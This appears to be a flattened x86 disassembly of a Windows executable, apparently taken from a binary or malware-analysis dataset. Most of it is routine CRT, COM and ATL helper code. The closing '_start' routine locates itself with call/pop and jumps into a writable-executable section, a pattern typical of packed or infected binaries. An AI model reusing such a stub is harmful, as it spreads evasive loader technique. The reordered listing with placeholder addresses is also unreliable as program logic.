cmp ecx [ ebp + 0x1c ]
jae r-xdata
add eax 0x4
mov dx [ eax - 0x4 ]
mov [ ecx + 0x8 ] dx
jmp r-xdata
mov [ ecx ] 0x5
add eax 0x8
mov edx [ eax - 0x8 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax - 0x4 ]
mov [ ecx + 0xc ] edx
jmp r-xdata
add eax 0x4
mov edx [ eax - 0x4 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov edx [ edx + 0x4 ]
mov [ ecx + 0xc ] edx
jmp r-xdata
add eax 0x4
mov dx [ eax - 0x4 ]
neg dx
sbb edx edx
mov [ ecx + 0x8 ] dx
jmp r-xdata
add eax 0x4
mov edx [ eax - 0x4 ]
mov esi ecx
mov ebx [ edx ]
mov [ esi ] ebx
mov ebx [ edx + 0x4 ]
mov [ esi + 0x4 ] ebx
mov ebx [ edx + 0x8 ]
mov [ esi + 0x8 ] ebx
mov edx [ edx + 0xc ]
mov [ esi + 0xc ] edx
mov ebx [ ebp - 0x1c ]
jmp r-xdata
add eax 0x4
mov edx [ eax - 0x4 ]
mov esi ecx
mov ebx [ edx ]
mov [ esi ] ebx
mov ebx [ edx + 0x4 ]
mov [ esi + 0x4 ] ebx
mov ebx [ edx + 0x8 ]
mov [ esi + 0x8 ] ebx
mov edx [ edx + 0xc ]
mov [ esi + 0xc ] edx
mov [ ecx ] 0xe
mov ebx [ ebp - 0x1c ]
jmp r-xdata
add eax 0x4
mov dl [ eax - 0x4 ]
mov [ ecx + 0x8 ] dl
jmp r-xdata
lea ecx [ ebp - 0x34 ]
push ecx
call [ VariantClear@IAT ]
mov eax [ ebp - 0x2c ]
mov [ esi ] eax
jmp r-xdata
mov ecx [ ebp - 0x2c ]
mov [ esi ] ecx
jmp r-xdata
jmp [ eax * 4 + jump_table_42d710 ]
sub ecx 0x10
add edi 0x2
cmp [ edi ] 0x0
jne r-xdata
mov dx [ ebp - 0x2c ]
mov [ esi ] dx
jmp r-xdata
fld [ ebp - 0x2c ]
fstp [ esi ]
jmp r-xdata
mov cx [ ebp - 0x2c ]
mov [ esi ] cx
jmp r-xdata
mov [ esi ] ecx
mov edx [ ebp - 0x30 ]
mov [ esi + 0x4 ] edx
mov eax [ ebp - 0x2c ]
mov [ esi + 0x8 ] eax
mov ecx [ ebp - 0x28 ]
mov [ esi + 0xc ] ecx
jmp r-xdata
mov [ esi ] ecx
mov eax [ ebp - 0x30 ]
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0x2c ]
mov [ esi + 0x8 ] ecx
mov edx [ ebp - 0x28 ]
mov [ esi + 0xc ] edx
jmp r-xdata
mov al [ ebp - 0x2c ]
mov [ esi ] al
jmp r-xdata
mov cl [ ebp - 0x2c ]
mov [ esi ] cl
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov [ esi ] eax
mov ecx [ ebp - 0x28 ]
mov [ esi + 0x4 ] ecx
jmp r-xdata
mov edx [ ebp - 0x2c ]
mov [ esi ] edx
mov eax [ ebp - 0x28 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_42d4da
mov esp [ ebp - 0x18 ]
mov esi [ GetLastError@IAT ]
call esi
test eax eax
jg r-xdata
call esi
and eax 0xffff
or eax 0x80070000
fwait
mov [ ebp - 0x4 ] 0xffffffff
lea esp [ ebp - 0x70 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call esi
fwait
mov [ ebp - 0x4 ] 0xffffffff
lea esp [ ebp - 0x70 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d784
add al [ ecx ]
add [ ecx ] al
add al [ eax ]
add [ edx ] eax
add [ ebx ] al
add [ edx ] eax
add [ ecx ] al
add [ edx ] eax
add al [ eax ]
add eax [ edx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add cl ah
int3
sub_42d7b0
push ecx
mov edx [ esp + 0x1c ]
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x20 ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push eax
mov eax [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
push eax
push ecx
call sub_42d180
mov esi eax
add esp 0x20
test esi esi
jge r-xdata
mov eax esi
pop esi
pop ecx
retn
mov edx [ esp + 0x4 ]
push edx
push 0x0
call [ SetErrorInfo@IAT ]
sub_42d800
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push 0x0
push eax
mov eax [ esp + 0xc ]
push ecx
push 0x2
push edx
push eax
call sub_42d7b0
add esp 0x18
retn 0x10
sub_42d830
sub esp 0x8
mov eax [ esp + 0x14 ]
cmp ax 0x9
mov [ esp ] ax
mov [ esp + 0x2 ] 0x0
je r-xdata
mov eax 0x8
cmp ax 0xd
mov eax 0x4
jne r-xdata
mov eax esi
pop esi
add esp 0x8
retn
mov ecx [ esp + 0x8 ]
push ecx
push 0x0
call [ SetErrorInfo@IAT ]
push esi
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0xc ]
push ecx
push 0x0
push 0x0
push eax
mov eax [ esp + 0x28 ]
push edx
push eax
call sub_42d180
mov esi eax
add esp 0x20
test esi esi
jge r-xdata
sub_42d8c0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push edi
mov edi [ esp + 0x10 ]
test edi edi
mov [ esp + 0xc ] 0x0
je r-xdata
push esi
call eax
mov eax [ esi + 0x4 ]
test eax eax
mov edi [ SysFreeString@IAT ]
je r-xdata
lea eax [ esp + 0xc ]
push eax
call [ CreateErrorInfo@IAT ]
test eax eax
jl r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push r--data
push eax
call [ ecx + 0xc ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
push eax
push ecx
call [ edx + 0x10 ]
mov ax [ esi ]
test ax ax
pop edi
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
push eax
push ecx
call [ edx + 0x14 ]
mov eax [ esi + 0x1c ]
pop esi
retn 0x8
cmp ax 0xfe00
jb r-xdata
mov edx [ esi + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0x1c ]
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push edi
push r--data
push eax
call [ ecx ]
test eax eax
jge r-xdata
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
push eax
push ecx
call [ edx + 0x18 ]
movzx eax ax
sub eax 0x7ffbfe00
pop esi
retn 0x8
mov eax 0x8004ffff
pop esi
retn 0x8
mov eax [ esp + 0xc ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov [ edi ] 0x0
sub_42dda1
mov edx [ esp + 0x4 ]
test edx edx
push esi
mov esi ecx
jl r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
cmp edx eax
jge r-xdata
lea ecx [ eax - 0x1 ]
cmp edx ecx
je r-xdata
dec [ esi + 0x4 ]
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi ]
sub eax edx
lea eax [ eax * 4 - 0x4 ]
lea ecx [ ecx + edx * 4 ]
push eax
lea eax [ ecx + 0x4 ]
push eax
push ecx
call memmove
add esp 0xc
pop esi
retn 0x4
sub_42dde4
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call free
and [ esi ] 0x0
pop ecx
sub_42de3a
mov eax [ esp + 0x4 ]
test eax eax
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp eax [ ecx + 0x4 ]
jge r-xdata
mov ecx [ ecx ]
lea eax [ ecx + eax * 2 ]
retn 0x4
sub_42de66
mov eax [ esp + 0x4 ]
test eax eax
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp eax [ ecx + 0x4 ]
jge r-xdata
mov ecx [ ecx ]
lea eax [ ecx + eax * 4 ]
retn 0x4
sub_42dea5
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
mov eax 0x80070057
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn 0x8
xor eax eax
cmp eax 0x2c
je r-xdata
push edi
xor edi edi
cmp [ esi + 0x24 ] edi
jle r-xdata
lea ecx [ esi + 0x20 ]
call sub_4011c0
lea eax [ esi + 0x4 ]
push eax
call [ DeleteCriticalSection@IAT ]
and [ esi ] 0x0
pop edi
push ebx
lea ebx [ esi + 0x20 ]
push edi
mov ecx ebx
call sub_42de3a
movzx eax [ eax ]
push [ esp + 0x14 ]
push eax
call [ UnregisterClassA@IAT ]
inc edi
cmp edi [ esi + 0x24 ]
jl r-xdata
pop ebx
sub_42df3d
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
lea eax [ esi + 0x18 ]
push edi
push eax
mov [ ebp - 0x8 ] eax
call [ EnterCriticalSection@IAT ]
xor edi edi
cmp [ esi + 0x34 ] edi
mov [ ebp - 0x4 ] 0x1
jle r-xdata
xor bl bl
lea ebx [ esi + 0x30 ]
push edi
mov ecx ebx
call sub_42dda1
mov bl 0x1
jmp r-xdata
inc edi
cmp edi [ esi + 0x34 ]
jl r-xdata
lea ecx [ ebp - 0x8 ]
call sub_406630
pop edi
pop esi
mov al bl
pop ebx
leave
retn 0x4
push edi
mov ecx ebx
call sub_42de66
mov eax [ eax ]
cmp eax [ ebp + 0x8 ]
je r-xdata
sub_42df96
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
lea eax [ esi + 0x18 ]
push eax
mov [ ebp - 0x8 ] eax
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0x34 ]
mov ecx [ ebp + 0x8 ]
cmp ecx eax
mov [ ebp - 0x4 ] 0x1
jg r-xdata
xor esi esi
test ecx ecx
jl r-xdata
cmp ecx eax
jne r-xdata
push ecx
lea ecx [ esi + 0x30 ]
call sub_42de66
mov esi [ eax ]
jmp r-xdata
mov esi [ esi + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_406630
mov eax esi
pop esi
leave
retn 0x4
sub_42dfe4
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
cmp eax ecx
push edi
jne r-xdata
push [ esp + 0xc ]
mov ecx esi
push [ esi + 0x4 ]
call sub_42de8d
inc [ esi + 0x4 ]
xor eax eax
inc eax
test ecx ecx
jne r-xdata
lea edi [ eax + eax ]
xor edi edi
inc edi
jmp r-xdata
pop edi
pop esi
retn 0x4
mov [ esi + 0x8 ] edi
mov [ esi ] eax
mov eax edi
shl eax 0x2
push eax
push [ esi ]
call realloc
test eax eax
pop ecx
pop ecx
je r-xdata
sub_42e02f
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x98
mov eax [ rw-data ]
push esi
mov [ ebp + 0x74 ] eax
mov esi ecx
call sub_42df05
mov eax __dos_header
push 0x94
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x20 ]
push 0x0
push eax
mov [ esi ] 0x3c
mov [ esi + 0xc ] 0x0
call memset
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] 0x94
call [ GetVersionExA@IAT ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
cmp [ ebp - 0x1c ] 0x5
jb r-xdata
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x710
mov [ esi + 0x14 ] r--data
call sub_412ee0
test eax eax
jge r-xdata
cmp [ ebp - 0x1c ] 0x4
ja r-xdata
jmp r-xdata
mov ecx [ ebp + 0x74 ]
mov eax esi
pop esi
call sub_42e72f
add ebp 0x78
leave
retn
mov [ rw-data ] 0x1
mov [ esi + 0xc ] 0x1
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
sub_42e0da
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
lea eax [ esi + 0x18 ]
push eax
mov [ ebp - 0x8 ] eax
call [ EnterCriticalSection@IAT ]
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x30 ]
mov [ ebp - 0x4 ] 0x1
call sub_42dfe4
test eax eax
lea ecx [ ebp - 0x8 ]
setne bl
call sub_406630
pop esi
mov al bl
pop ebx
leave
retn 0x4
sub_42e1f7
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov [ eax ] r--data
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x14 ] 0x2
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x18 ] cx
mov [ eax + 0x1a ] cx
mov [ eax + 0x8 ] eax
retn 0x4
sub_42e263
push esi
mov esi [ esp + 0x8 ]
add esi 0x8
and esi 0xfffffff8
mov edx esi
imul edx [ esp + 0xc ]
push edi
mov edi ecx
mov ecx [ edi + 0x4 ]
mov eax [ ecx ]
add edx 0x10
push edx
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
dec esi
and [ eax + 0x4 ] 0x0
mov [ eax ] edi
mov [ eax + 0xc ] 0x1
mov [ eax + 0x8 ] esi
sub_42e29d
mov ecx [ ecx + 0x4 ]
mov eax [ ecx ]
push esi
mov esi [ esp + 0xc ]
add esi 0x8
and esi 0xfffffff8
mov edx esi
imul edx [ esp + 0x10 ]
add edx 0x10
push edx
push [ esp + 0xc ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
pop esi
retn 0xc
dec esi
mov [ eax + 0x8 ] esi
sub_42e2cb
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push ebx
mov ebx [ esi + 0x8 ]
cmp ebx [ esi + 0xc ]
jae r-xdata
lea eax [ esi + 0x10 ]
push eax
call [ DeleteCriticalSection@IAT ]
and [ esi ] 0x0
pop ebx
push edi
add ebx 0x4
cmp ebx [ esi + 0xc ]
jb r-xdata
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov edi [ ebx ]
test edi edi
je r-xdata
pop edi
and [ edi + 0x10 ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_42e31c
push esi
mov esi ecx
push edi
lea edi [ esi + 0x10 ]
mov ecx edi
call sub_401080
mov ecx edi
mov [ esi ] 0x28
mov [ esi + 0x4 ] __dos_header
mov [ esi + 0x8 ] r--data
mov [ esi + 0xc ] r--data
call sub_412ee0
test eax eax
jge r-xdata
pop edi
mov eax esi
pop esi
retn
mov [ rw-data ] 0x1
sub_42e3bc
push esi
mov esi [ esp + 0x8 ]
jmp r-xdata
push esi
call malloc
test eax eax
pop ecx
je r-xdata
push esi
call _callnewh
test eax eax
pop ecx
jne r-xdata
pop esi
retn
call [ std::_Nomemory@IAT ]
sub_42e6fe
push 0x8
push r--data
call sub_42eda4
and [ ebp - 0x4 ] 0x0
push 0x0
push 0x1
call __security_error_handler
pop ecx
pop ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x3
call [ ExitProcess@IAT ]
sub_42e74f
push ebx
mov bl [ esp + 0x8 ]
test bl 0x2
push esi
mov esi ecx
je r-xdata
mov ecx esi
call ??1type_info@@UAE@XZ
test bl 0x1
je r-xdata
push edi
push ??1type_info@@UAE@XZ
lea edi [ esi - 0x4 ]
push [ edi ]
push 0xc
push esi
call sub_42e834
test bl 0x1
je r-xdata
mov eax esi
push esi
call ??3@YAXPAX@Z
pop ecx
mov eax edi
pop edi
jmp r-xdata
push edi
call operator delete
pop ecx
pop esi
pop ebx
retn 0x4
sub_42e7d6
push 0x14
push r--data
call sub_42eda4
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_42eddf
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_42e805
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call ?terminate@@YAXXZ
int3
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_42e834
push 0xc
push r--data
call sub_42eda4
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_42e87c
call sub_42eddf
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_42e894
push 0x10
push r--data
call sub_42eda4
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
call sub_42e8de
call sub_42eddf
retn 0x14
mov esi [ ebp + 0x8 ]
mov ecx esi
call [ ebp + 0x14 ]
add esi [ ebp + 0xc ]
mov [ ebp + 0x8 ] esi
inc [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x10 ]
jge r-xdata
sub_42e910
cmp eax 0x1000
jae r-xdata
push ecx
lea ecx [ esp + 0x8 ]
neg eax
add eax esp
add eax 0x4
test [ eax ] eax
xchg esp eax
mov eax [ eax ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub_42ea10
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_42ead0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_42eb16
push 0x0
call [ GetModuleHandleA@IAT ]
cmp [ eax ] 0x5a4d
jne r-xdata
xor eax eax
retn
mov ecx [ eax + 0x3c ]
add ecx eax
cmp [ ecx ] 0x4550
jne r-xdata
movzx eax [ ecx + 0x18 ]
cmp eax 0x10b
je r-xdata
xor eax eax
cmp [ ecx + 0x74 ] 0xe
jbe r-xdata
cmp eax 0x20b
je r-xdata
retn
cmp [ ecx + 0xe8 ] eax
xor eax eax
cmp [ ecx + 0x84 ] 0xe
jbe r-xdata
cmp [ ecx + 0xf8 ] eax
jmp r-xdata
setne al
sub_42eb6c
push 0x74
push r--data
call sub_42eda4
xor edi edi
mov [ ebp - 0x20 ] edi
push edi
mov ebx [ GetModuleHandleA@IAT ]
call ebx
cmp [ eax ] 0x5a4d
jne r-xdata
mov [ ebp - 0x1c ] edi
jmp r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
cmp [ ecx ] 0x4550
jne r-xdata
mov [ ebp - 0x4 ] edi
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_42eea4
call sub_42ef4d
cmp [ rw-data ] edi
jne r-xdata
movzx eax [ ecx + 0x18 ]
cmp eax 0x10b
je r-xdata
call sub_42ef32
push rw-data
push rw-data
call _initterm
push sub_42eee8
call sub_42e6e6
mov eax [ rw-data ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call [ __wgetmainargs@IAT ]
add esp 0x20
mov [ ebp - 0x3c ] eax
cmp eax edi
jge r-xdata
push sub_42ef4a
call [ __setusermatherr@IAT ]
pop ecx
cmp [ ecx + 0x74 ] 0xe
jbe r-xdata
cmp eax 0x20b
je r-xdata
push rw-data
push rw-data
call _initterm
pop ecx
pop ecx
mov eax [ _wcmdln@IAT ]
mov esi [ eax ]
cmp esi edi
jne r-xdata
push 0x8
call _amsg_exit
pop ecx
xor eax eax
cmp [ ecx + 0xe8 ] edi
cmp [ ecx + 0x84 ] 0xe
jbe r-xdata
mov [ ebp - 0x24 ] esi
mov ax [ esi ]
cmp ax 0x20
ja r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax 0xff
jmp r-xdata
xor eax eax
cmp [ ecx + 0xf8 ] edi
jmp r-xdata
cmp ax 0x22
jne r-xdata
cmp ax di
je r-xdata
call sub_42eddf
retn
setne al
mov [ ebp - 0x1c ] eax
inc esi
inc esi
jmp r-xdata
xor eax eax
cmp [ ebp - 0x20 ] edi
sete al
mov [ ebp - 0x20 ] eax
mov ax [ esi ]
cmp ax di
je r-xdata
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov [ ebp - 0x58 ] edi
lea eax [ ebp - 0x84 ]
push eax
call [ GetStartupInfoW@IAT ]
test [ ebp - 0x58 ] 0x1
je r-xdata
cmp ax 0x20
ja r-xdata
push 0xa
pop eax
movzx eax [ ebp - 0x54 ]
jmp r-xdata
inc esi
inc esi
mov [ ebp - 0x24 ] esi
jmp r-xdata
call [ _cexit@IAT ]
push esi
call [ exit@IAT ]
push eax
push esi
push edi
push edi
call ebx
push eax
call sub_416960
mov esi eax
mov [ ebp - 0x40 ] esi
cmp [ ebp - 0x1c ] edi
jne r-xdata
sub_42eda4
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] esp
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_42ee02
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
mov [ rw-data ] esi
jne r-xdata
cmp eax 0xbb40e64e
jne r-xdata
pop esi
mov [ rw-data ] 0xbb40e64e
leave
retn
sub_42eea4
push 0xc
push r--data
call sub_42eda4
mov [ ebp - 0x1c ] r--data
call sub_42eddf
retn
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
jmp r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
sub_42eee8
push 0xc
push r--data
call sub_42eda4
mov [ ebp - 0x1c ] r--data
call sub_42eddf
retn
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
jmp r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
sub_42ef19
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x1c ] r--data
jae r-xdata
call sub_42eddf
retn
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
jmp r-xdata
_start
push ebp
mov ebp esp
sub esp 0x574
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0x154 ] 0x0
mov [ ebp - 0x284 ] 0x0
call sub_44827d
nop
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_448f70
add esp 0x4
call sub_449130
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_449160
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
